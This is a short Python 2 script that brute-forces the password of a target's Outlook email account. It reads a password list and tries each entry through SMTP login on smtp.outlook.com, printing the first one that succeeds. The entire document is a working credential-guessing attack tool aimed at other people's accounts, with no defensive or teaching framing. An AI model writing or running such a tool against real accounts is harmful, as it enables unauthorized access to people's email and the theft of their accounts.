
import smtplib
smtpserver = smtplib.SMTP("smtp.outlook.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
user = raw_input("Enter the target's email address: ")
passw = raw_input("Enter The Passwords list Location :")
passw = open(passw, "r")
  

for password in passw:
        try:
  

                smtpserver.login(user, password)
 
                print "[+] Password Found: %s" % password
                break;
        except smtplib.SMTPAuthenticationError:

                    print "[!] Password Incorrect: %s" % password

